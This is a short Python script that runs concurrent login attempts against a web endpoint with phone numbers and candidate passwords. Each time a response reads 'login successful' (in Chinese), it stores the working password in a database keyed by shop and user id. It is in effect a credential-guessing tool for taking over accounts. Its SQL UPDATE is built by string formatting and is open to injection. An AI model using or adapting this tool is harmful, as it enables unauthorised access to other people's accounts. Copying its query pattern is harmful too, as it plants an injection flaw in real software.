#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import threading


def create_thread(url, session, login_data, headers, db, shop_name, uid, count):
    threading.Thread(target=try_password, args=(url, session, login_data, headers, db, shop_name, uid, count)).start()


def try_password(url, session, login_data, headers, db, shop_name, uid, count):

    res = session.post(url=url, json=login_data, headers=headers)

    res_json = res.json()

    if res_json["res_code"] == 1 and res_json["msg"] == "登录成功":
        print(".......%s---password=%s...登录---成功.......%d" % (login_data["phone"], login_data["pwd"], count))
        db.execute_sql("UPDATE user SET password=\"%s\" WHERE shop_name=\"%s\" AND uid=\"%s\"" % (
        login_data["pwd"], shop_name, uid))
    else:
        print(".......%s......登录---失败.......%d" % (login_data["phone"], count))